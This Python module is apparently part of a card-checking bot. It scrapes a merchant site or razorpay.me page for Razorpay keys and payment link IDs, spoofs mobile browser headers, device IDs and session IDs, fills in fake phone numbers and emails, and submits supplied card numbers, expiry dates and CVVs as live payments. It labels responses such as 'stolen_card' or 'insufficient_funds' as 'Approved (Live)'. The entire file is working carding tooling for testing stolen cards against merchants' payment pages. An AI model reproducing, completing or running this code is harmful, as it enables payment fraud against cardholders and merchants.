import httpx
import asyncio
import time
import random
import re
import json
import hashlib
import os
import logging

logger = logging.getLogger(__name__)

UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
SEC_HEADERS = {
    "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": '"Android"',
}


def _generate_device_id():
    raw = os.urandom(20).hex()
    sha1 = hashlib.sha1(raw.encode()).hexdigest()
    epoch_ms = str(int(time.time() * 1000))
    rand8 = str(random.randint(0, 99999999)).zfill(8)
    return f"1.{sha1}.{epoch_ms}.{rand8}"


def _generate_unified_session_id():
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    return ''.join(random.choices(chars, k=14))


def _random_contact():
    return f"+918{str(random.randint(0, 999999999)).zfill(9)}"


def _random_email():
    return f"user{random.randint(100000, 999999)}@gmail.com"


def _sanitize_js_object(raw):
    s = raw.strip().rstrip(";")
    s = re.sub(r"'", '"', s)
    s = re.sub(r'(?<!")(\b\w+)\s*:', r'"\1":', s)
    s = re.sub(r',\s*([\]}])', r'\1', s)
    return s


def _extract_json_from_html(html):
    patterns = [
        r'var\s+data\s*=\s*(\{.*?\})\s*;',
        r'window\.data\s*=\s*(\{.*?\})\s*;',
        r'__NEXT_DATA__.*?(\{.*?"key_id"\s*:\s*"rzp_[^}]+\})',
    ]
    for pat in patterns:
        match = re.search(pat, html, re.DOTALL)
        if match:
            raw = match.group(1).rstrip(";")
            try:
                return json.loads(raw)
            except json.JSONDecodeError:
                try:
                    sanitized = _sanitize_js_object(raw)
                    return json.loads(sanitized)
                except json.JSONDecodeError:
                    continue

    key_match = re.search(r'["\']?(key_id|key)["\']?\s*[:=]\s*["\']?(rzp_(?:live|test)_[A-Za-z0-9]+)["\']?', html)
    pl_match = re.search(r'["\']?id["\']?\s*[:=]\s*["\']?(plink_[A-Za-z0-9]+)["\']?', html)
    if key_match:
        result = {"key_id": key_match.group(2)}
        if pl_match:
            result["payment_link"] = {"id": pl_match.group(1)}
        ppi_match = re.search(r'"payment_page_items"\s*:\s*\[(\{[^]]+\})\]', html)
        if ppi_match:
            try:
                item = json.loads(ppi_match.group(1))
                result["payment_link"]["payment_page_items"] = [item]
            except Exception:
                pass
        kh_match = re.search(r'"keyless_header"\s*:\s*"([^"]+)"', html)
        if kh_match:
            result["keyless_header"] = kh_match.group(1)
        return result

    return None


def _find_razorpay_me_links(html):
    links = re.findall(r'https?://razorpay\.me/[^\s"\'<>]+', html)
    links += re.findall(r'https?://pages\.razorpay\.com/[^\s"\'<>]+', html)
    return list(set(links))


async def _resolve_site_to_razorpay(client, site_url, common_headers):
    try:
        r = await client.get(site_url, headers={
            **common_headers,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
        })
    except Exception as e:
        return None, None, f"Site unreachable: {str(e)[:50]}"

    html = r.text
    if not html:
        return None, None, "Empty response from site"

    data = _extract_json_from_html(html)
    if data and data.get("key_id"):
        return data, html, None

    rzp_links = _find_razorpay_me_links(html)

    if not rzp_links:
        donate_patterns = re.findall(
            r'href=["\']([^"\']*(?:donat|pay|checkout|give)[^"\']*)["\']',
            html, re.IGNORECASE
        )
        from urllib.parse import urlparse, urljoin
        for href in donate_patterns[:5]:
            full = urljoin(site_url, href)
            try:
                r2 = await client.get(full, headers={
                    **common_headers,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                }, timeout=10)
                sub_html = r2.text
                data2 = _extract_json_from_html(sub_html)
                if data2 and data2.get("key_id"):
                    return data2, sub_html, None
                sub_links = _find_razorpay_me_links(sub_html)
                rzp_links.extend(sub_links)
            except Exception:
                pass

    for rzp_link in rzp_links[:3]:
        try:
            logger.info(f"[RZ] Following razorpay link: {rzp_link}")
            r3 = await client.get(rzp_link, headers={
                **common_headers,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
            }, timeout=12)
            rzp_html = r3.text
            data3 = _extract_json_from_html(rzp_html)
            if data3 and data3.get("key_id"):
                logger.info(f"[RZ] Found data from razorpay link: key={data3.get('key_id','?')[:20]}")
                return data3, rzp_html, None
        except Exception:
            pass

    from bs4 import BeautifulSoup
    try:
        soup = BeautifulSoup(html, 'html.parser')
        for script_tag in soup.find_all('script', src=True):
            src = script_tag.get('src', '') or ''
            if 'razorpay' in src.lower() or 'checkout' in src.lower() or 'payment' in src.lower():
                from urllib.parse import urljoin
                js_url = urljoin(site_url, src)
                try:
                    logger.info(f"[RZ] Fetching external JS: {js_url[:80]}")
                    r_js = await client.get(js_url, headers={**common_headers, "Accept": "*/*"}, timeout=10)
                    js_text = r_js.text
                    data_js = _extract_json_from_html(js_text)
                    if data_js and data_js.get("key_id"):
                        return data_js, js_text, None
                    js_rzp_links = _find_razorpay_me_links(js_text)
                    for jl in js_rzp_links[:2]:
                        try:
                            r_jl = await client.get(jl, headers={**common_headers, "Accept": "text/html"}, timeout=10)
                            data_jl = _extract_json_from_html(r_jl.text)
                            if data_jl and data_jl.get("key_id"):
                                return data_jl, r_jl.text, None
                        except Exception:
                            pass
                except Exception:
                    pass
    except Exception:
        pass

    key_only = re.search(r'(rzp_live_[A-Za-z0-9]{8,})', html)
    if key_only:
        return None, html, f"Found key {key_only.group(1)[:20]}... but no payment link. Site uses server-side Razorpay (not supported). Use a razorpay.me link instead."

    return None, html, "Razorpay data not found on page. Try a razorpay.me/pay/ link instead."


async def razorpay_check(cc, mm, yy, cvv, proxy=None):
    start = time.time()

    if len(yy) == 4:
        yy = yy[2:]

    cc_9 = cc[:9]
    device_id = _generate_device_id()
    unified_session_id = _generate_unified_session_id()

    transport_kwargs = {}
    if proxy:
        transport_kwargs["proxy"] = proxy

    async with httpx.AsyncClient(
        timeout=30,
        follow_redirects=True,
        **transport_kwargs,
    ) as client:

        common_headers = {
            "User-Agent": UA,
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            **SEC_HEADERS,
        }

        site_url = None
        config = _load_razorpay_config()
        if config.get("site"):
            site_url = config["site"]
        else:
            elapsed = round(time.time() - start, 2)
            return f"Error - No Razorpay site configured. Use /addrzsite <url> [{elapsed}s]"

        data, html, err_msg = await _resolve_site_to_razorpay(client, site_url, common_headers)

        if err_msg:
            elapsed = round(time.time() - start, 2)
            return f"Error - {err_msg} [{elapsed}s]"

        if not data:
            elapsed = round(time.time() - start, 2)
            return f"Error - Razorpay data not found [{elapsed}s]"

        key_id = data.get("key_id", "")
        if not key_id or not key_id.startswith("rzp_"):
            key_match = re.search(r'(rzp_live_[A-Za-z0-9]+)', html) if html else None
            if key_match:
                key_id = key_match.group(1)
            else:
                elapsed = round(time.time() - start, 2)
                return f"Error - No live Razorpay key found [{elapsed}s]"

        payment_link = data.get("payment_link", {})
        if isinstance(payment_link, str):
            payment_link = {"id": payment_link}
        payment_link_id = payment_link.get("id", "")
        payment_page_items = payment_link.get("payment_page_items", [])

        payment_page_id = ""
        page_item_min_amount = None
        page_item_amount = None
        if payment_page_items and isinstance(payment_page_items, list) and len(payment_page_items) > 0:
            item = payment_page_items[0]
            if isinstance(item, dict):
                payment_page_id = item.get("id", "")
                if item.get("min_amount") is not None:
                    try:
                        page_item_min_amount = int(item["min_amount"])
                    except (ValueError, TypeError):
                        pass
                if item.get("item") and isinstance(item["item"], dict):
                    if item["item"].get("amount") is not None:
                        try:
                            page_item_amount = int(item["item"]["amount"])
                        except (ValueError, TypeError):
                            pass
                if page_item_amount is None and item.get("amount") is not None:
                    try:
                        page_item_amount = int(item["amount"])
                    except (ValueError, TypeError):
                        pass
            elif isinstance(item, str):
                payment_page_id = item

        if page_item_min_amount is None and html:
            min_match = re.search(r'"min_amount"\s*:\s*(\d+)', html)
            if min_match:
                try:
                    page_item_min_amount = int(min_match.group(1))
                except (ValueError, TypeError):
                    pass

        keyless_header = data.get("keyless_header", "")

        if not payment_link_id:
            pl_match = re.search(r'(plink_[A-Za-z0-9]+)', html)
            if pl_match:
                payment_link_id = pl_match.group(1)

        if not payment_link_id:
            elapsed = round(time.time() - start, 2)
            return f"Error - Payment link ID not found [{elapsed}s]"

        if not payment_page_id:
            ppi_match = re.search(r'(ppi_[A-Za-z0-9]+)', html)
            if ppi_match:
                payment_page_id = ppi_match.group(1)

        if not payment_page_id:
            elapsed = round(time.time() - start, 2)
            return f"Error - Payment page item ID not found [{elapsed}s]"

        scripts = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html)
        checkout_url = None
        for src in scripts:
            if "checkout" in src and ".js" in src:
                checkout_url = src
                break

        if not checkout_url:
            checkout_url = "https://checkout.razorpay.com/v1/checkout.js"

        try:
            r2 = await client.get(checkout_url, headers={
                **common_headers,
                "Accept": "*/*",
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site",
            })
            js_text = r2.text
        except Exception:
            elapsed = round(time.time() - start, 2)
            return f"Error - Failed to download checkout.js [{elapsed}s]"

        build_v1 = None
        build = None

        build_v1_patterns = [
            r'build_v1\s*:\s*"([a-f0-9]+)"',
            r'"build_v1"\s*:\s*"([a-f0-9]+)"',
            r'buildV1\s*[:=]\s*"([a-f0-9]+)"',
        ]
        for pat in build_v1_patterns:
            m = re.search(pat, js_text, re.I)
            if m:
                build_v1 = m.group(1)
                break

        build_patterns = [
            r'\bg\s*=\s*"([a-f0-9]{6,})"',
            r'"build"\s*:\s*"([a-f0-9]+)"',
            r'build\s*[:=]\s*"([a-f0-9]{6,})"',
        ]
        for pat in build_patterns:
            m = re.search(pat, js_text, re.I)
            if m:
                build = m.group(1)
                break

        if not build:
            build = hashlib.md5(js_text[:500].encode()).hexdigest()[:8]
        if not build_v1:
            build_v1 = hashlib.md5(js_text[-500:].encode()).hexdigest()[:8]

        checkout_public_url = (
            f"https://api.razorpay.com/v1/checkout/public?"
            f"traffic_env=production&build={build}&build_v1={build_v1}"
            f"&checkout_v2=1&new_session=1&rzp_device_id={device_id}"
            f"&unified_session_id={unified_session_id}"
        )

        try:
            r3 = await client.get(checkout_public_url, headers={
                **common_headers,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Referer": "https://razorpay.me/",
                "Sec-Fetch-Dest": "iframe",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "cross-site",
                "Upgrade-Insecure-Requests": "1",
            })
        except Exception:
            elapsed = round(time.time() - start, 2)
            return f"Error - Checkout session failed [{elapsed}s]"

        session_token = None
        session_patterns = [
            r'window\.session_token="([^"]+)"',
            r'session_token\s*[:=]\s*"([^"]+)"',
            r'"session_token"\s*:\s*"([^"]+)"',
        ]
        for pat in session_patterns:
            m = re.search(pat, r3.text)
            if m:
                session_token = m.group(1)
                break

        if not session_token:
            elapsed = round(time.time() - start, 2)
            return f"Error - Session token not found [{elapsed}s]"

        configured_amount = config.get("amount", "100")
        try:
            amount_int = int(configured_amount)
        except (ValueError, TypeError):
            amount_int = 100

        if page_item_amount and page_item_amount > 0:
            amount_int = page_item_amount
            logger.info(f"[RZ] Using fixed page item amount: {amount_int}")
        elif page_item_min_amount and page_item_min_amount > 0 and amount_int < page_item_min_amount:
            amount_int = page_item_min_amount
            logger.info(f"[RZ] Adjusted amount to min: {amount_int}")

        amount = str(amount_int)

        order_payload = {
            "notes": {"comment": ""},
            "line_items": [
                {
                    "payment_page_item_id": payment_page_id,
                    "amount": amount_int,
                }
            ]
        }

        referer_url = (
            f"https://api.razorpay.com/v1/checkout/public?"
            f"traffic_env=production&build={build}&build_v1={build_v1}"
            f"&checkout_v2=1&new_session=1&rzp_device_id={device_id}"
            f"&unified_session_id={unified_session_id}&session_token={session_token}"
        )

        try:
            r4 = await client.post(
                f"https://api.razorpay.com/v1/payment_pages/{payment_link_id}/order",
                json=order_payload,
                headers={
                    **common_headers,
                    "Accept": "application/json, text/plain, */*",
                    "Content-Type": "application/json",
                    "Origin": "https://razorpay.me",
                    "Referer": "https://razorpay.me/",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "cross-site",
                    "x-session-token": session_token,
                },
            )
            order_data = r4.json()
        except Exception as e:
            elapsed = round(time.time() - start, 2)
            return f"Error - Order creation failed: {str(e)[:50]} [{elapsed}s]"

        if not order_data or "error" in order_data:
            err_msg = "Unknown"
            if isinstance(order_data, dict):
                err = order_data.get("error", {})
                if isinstance(err, dict):
                    err_msg = err.get("description", err.get("message", "Unknown"))
                elif isinstance(err, str):
                    err_msg = err

            err_str = str(err_msg).lower()
            if "min" in err_str and "amount" in err_str:
                min_match = re.search(r'(\d{2,})', str(err_msg))
                if min_match:
                    retry_amount = int(min_match.group(1))
                    logger.info(f"[RZ] Retrying with min amount from error: {retry_amount}")
                    order_payload["line_items"][0]["amount"] = retry_amount
                    amount_int = retry_amount
                    amount = str(amount_int)
                    try:
                        r4_retry = await client.post(
                            f"https://api.razorpay.com/v1/payment_pages/{payment_link_id}/order",
                            json=order_payload,
                            headers={
                                **common_headers,
                                "Accept": "application/json, text/plain, */*",
                                "Content-Type": "application/json",
                                "Origin": "https://razorpay.me",
                                "Referer": "https://razorpay.me/",
                                "Sec-Fetch-Dest": "empty",
                                "Sec-Fetch-Mode": "cors",
                                "Sec-Fetch-Site": "cross-site",
                                "x-session-token": session_token,
                            },
                        )
                        order_data = r4_retry.json()
                        if order_data and "error" not in order_data:
                            pass
                        else:
                            elapsed = round(time.time() - start, 2)
                            return f"Error - {str(err_msg)[:60]} [{elapsed}s]"
                    except Exception:
                        elapsed = round(time.time() - start, 2)
                        return f"Error - {str(err_msg)[:60]} [{elapsed}s]"
                else:
                    elapsed = round(time.time() - start, 2)
                    return f"Error - {str(err_msg)[:60]} [{elapsed}s]"
            else:
                elapsed = round(time.time() - start, 2)
                return f"Error - {str(err_msg)[:60]} [{elapsed}s]"

        order_id = None
        order_amount = str(amount)
        order_currency = "INR"
        if isinstance(order_data, dict):
            order_obj = order_data.get("order", {})
            if isinstance(order_obj, dict):
                order_id = order_obj.get("id")
                if order_obj.get("amount"):
                    order_amount = str(order_obj["amount"])
                if order_obj.get("currency"):
                    order_currency = order_obj["currency"]
            if not order_id:
                order_id = order_data.get("id")
            if not order_amount or order_amount == str(amount):
                if order_data.get("amount"):
                    order_amount = str(order_data["amount"])
                if order_data.get("currency"):
                    order_currency = order_data["currency"]

        if not order_id:
            elapsed = round(time.time() - start, 2)
            return f"Error - Order ID not found [{elapsed}s]"

        iin_url = (
            f"https://api.razorpay.com/v1/standard_checkout/payment/iin?"
            f"key_id={key_id}&session_token={session_token}"
        )
        if keyless_header:
            iin_url += f"&keyless_header={keyless_header}"
        iin_url += f"&iin={cc_9}"

        try:
            r5 = await client.get(iin_url, headers={
                **common_headers,
                "Accept": "*/*",
                "Content-type": "application/x-www-form-urlencoded",
                "Referer": referer_url,
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "x-session-token": session_token,
            })
            iin_data = r5.json()
        except Exception as e:
            elapsed = round(time.time() - start, 2)
            return f"Error - IIN lookup failed: {str(e)[:50]} [{elapsed}s]"

        if not iin_data or "error" in iin_data:
            err_desc = ""
            if isinstance(iin_data, dict):
                err = iin_data.get("error", {})
                if isinstance(err, dict):
                    err_desc = err.get("description", "")
                elif isinstance(err, str):
                    err_desc = err
            elapsed = round(time.time() - start, 2)
            if "invalid" in err_desc.lower() or not err_desc:
                return f"Declined - Invalid Card / BIN rejected [{elapsed}s]"
            return f"Declined - {err_desc[:60]} [{elapsed}s]"

        country = iin_data.get("country", "")
        network = iin_data.get("network", "")
        card_type = iin_data.get("type", "")
        issuer = iin_data.get("issuer", "")

        if not country or not network:
            elapsed = round(time.time() - start, 2)
            return f"Declined - Card network/country not found [{elapsed}s]"

        forex_payload = {
            "identifiers": {
                "merchant": {"country": "IN"},
                "card": {
                    "country": country,
                    "dcc_blacklist": False,
                    "network": network,
                },
                "method": "card",
                "payment_currency": "INR",
            },
            "forex_charges": {
                "amount": amount_int,
                "currency": "INR",
                "filters": {"method": "card"},
            },
        }

        try:
            r6 = await client.post(
                f"https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?"
                f"key_id={key_id}&keyless_header={keyless_header}",
                json=forex_payload,
                headers={
                    **common_headers,
                    "Accept": "*/*",
                    "Content-type": "application/json",
                    "Origin": "https://api.razorpay.com",
                    "Referer": referer_url,
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "x-session-token": session_token,
                },
            )
            forex_data = r6.json()
        except Exception as e:
            elapsed = round(time.time() - start, 2)
            return f"Error - Forex check failed: {str(e)[:50]} [{elapsed}s]"

        currency_id = ""
        if forex_data and isinstance(forex_data, dict):
            fc = forex_data.get("forex_charges", {})
            if isinstance(fc, dict):
                currency_id = fc.get("id", "")

        info_parts = []
        if network:
            info_parts.append(f"Network: {network}")
        if card_type:
            info_parts.append(f"Type: {card_type}")
        if country:
            info_parts.append(f"Country: {country}")
        if issuer:
            info_parts.append(f"Issuer: {issuer}")

        info_str = " | ".join(info_parts) if info_parts else ""

        contact = _random_contact()
        email = _random_email()

        payment_payload = {
            "key_id": key_id,
            "amount": order_amount,
            "currency": order_currency,
            "email": email,
            "contact": contact,
            "order_id": order_id,
            "method": "card",
            "card[number]": cc,
            "card[expiry_month]": mm.zfill(2),
            "card[expiry_year]": yy.zfill(2),
            "card[cvv]": cvv,
            "card[name]": "",
            "payment_link_id": payment_link_id,
            "recurring": "0",
            "recurring_token[max_amount]": "0",
            "recurring_token[expire_by]": "0",
            "recurring_token[frequency]": "",
            "_[source]": "checkoutjs",
            "_[version]": "7",
            "_[platform]": "mobile",
            "_[checkout_id]": unified_session_id,
            "_[device_id]": device_id,
        }

        if keyless_header:
            payment_payload["keyless_header"] = keyless_header

        pay_url = "https://api.razorpay.com/v1/payments/create/ajax"
        if keyless_header:
            pay_url += f"?key_id={key_id}&keyless_header={keyless_header}"

        logger.info(f"[RZ] Payment submit: order_id={order_id}, amount={order_amount}, currency={order_currency}")

        try:
            r7 = await client.post(
                pay_url,
                data=payment_payload,
                headers={
                    **common_headers,
                    "Accept": "application/json, text/plain, */*",
                    "Content-type": "application/x-www-form-urlencoded",
                    "Origin": "https://api.razorpay.com",
                    "Referer": referer_url,
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "x-session-token": session_token,
                },
            )
            pay_data = r7.json()
            logger.info(f"[RZ] Payment response: {json.dumps(pay_data)[:500]}")
        except Exception as e:
            elapsed = round(time.time() - start, 2)
            return f"Error - Payment submit failed: {str(e)[:50]} | {info_str} [{elapsed}s]"

        elapsed = round(time.time() - start, 2)

        if not pay_data or not isinstance(pay_data, dict):
            return f"Error - Empty payment response | {info_str} [{elapsed}s]"

        if "error" in pay_data:
            err = pay_data.get("error", {})
            if isinstance(err, dict):
                err_code = err.get("code", "")
                err_desc = err.get("description", "")
                err_reason = err.get("reason", "")
                err_field = err.get("field", "")
                err_source = err.get("source", "")
                err_step = err.get("step", "")

                live_reasons = [
                    "insufficient_funds", "do_not_honor", "lost_card",
                    "stolen_card", "pickup_card", "restricted_card",
                    "incorrect_cvc", "invalid_cvc", "card_velocity_exceeded",
                    "try_again_later", "not_permitted", "generic_decline",
                ]

                if err_source == "bank" or err_step == "payment_authorization":
                    if err_reason in live_reasons or any(r in err_desc.lower() for r in ["insufficient", "do not honor", "lost", "stolen", "cvc", "cvv"]):
                        return f"Approved - {err_desc[:60]} (Live Declined) | {info_str} [{elapsed}s]"
                    if "expired" in err_desc.lower():
                        return f"Declined - Card Expired | {info_str} [{elapsed}s]"
                    return f"Approved - Bank Declined: {err_desc[:50]} | {info_str} [{elapsed}s]"

                if "3dsecure" in err_desc.lower() or "3ds" in err_desc.lower() or "authentication" in err_desc.lower():
                    return f"Approved - 3DS Required (Live) | {info_str} [{elapsed}s]"

                if "invalid" in err_desc.lower() and ("card" in err_desc.lower() or "number" in err_desc.lower()):
                    return f"Declined - Invalid Card | {info_str} [{elapsed}s]"

                if "expired" in err_desc.lower():
                    return f"Declined - Card Expired | {info_str} [{elapsed}s]"

                if err_code == "BAD_REQUEST_ERROR" and "trouble" in err_desc.lower():
                    return f"Error - Site rejected payment (try /addrzsite with a different razorpay.me link) | {info_str} [{elapsed}s]"

                if err_code == "BAD_REQUEST_ERROR":
                    return f"Error - {err_desc[:60]} | {info_str} [{elapsed}s]"

                return f"Declined - {err_desc[:60]} | {info_str} [{elapsed}s]"
            else:
                return f"Declined - {str(err)[:60]} | {info_str} [{elapsed}s]"

        razorpay_payment_id = pay_data.get("razorpay_payment_id", "")
        next_action = pay_data.get("next", [])

        if razorpay_payment_id:
            return f"Charged - Payment OK ({razorpay_payment_id[:20]}) | {info_str} [{elapsed}s]"

        if next_action:
            action_url = ""
            if isinstance(next_action, list) and len(next_action) > 0:
                first = next_action[0]
                if isinstance(first, dict):
                    action_url = first.get("url", first.get("redirect_url", ""))
            elif isinstance(next_action, dict):
                action_url = next_action.get("redirect_url", next_action.get("url", ""))

            if action_url and ("3dsecure" in action_url.lower() or "acs" in action_url.lower() or "authenticate" in action_url.lower()):
                return f"Approved - 3DS Required (Live) | {info_str} [{elapsed}s]"
            return f"Approved - Action Required (Live) | {info_str} [{elapsed}s]"

        return f"Approved - Payment Accepted | {info_str} [{elapsed}s]"


RZ_CONFIG_FILE = os.path.join(os.path.dirname(__file__), "..", "razorpay_config.json")


def _load_razorpay_config():
    try:
        if os.path.exists(RZ_CONFIG_FILE):
            with open(RZ_CONFIG_FILE, "r") as f:
                return json.load(f)
    except Exception:
        pass
    return {}


def _save_razorpay_config(config):
    try:
        with open(RZ_CONFIG_FILE, "w") as f:
            json.dump(config, f, indent=2)
    except Exception:
        pass


def set_razorpay_site(url, amount="100"):
    config = _load_razorpay_config()
    config["site"] = url
    config["amount"] = amount
    _save_razorpay_config(config)


def get_razorpay_site():
    config = _load_razorpay_config()
    return config.get("site", ""), config.get("amount", "100")


def remove_razorpay_site():
    config = _load_razorpay_config()
    config.pop("site", None)
    config.pop("amount", None)
    _save_razorpay_config(config)
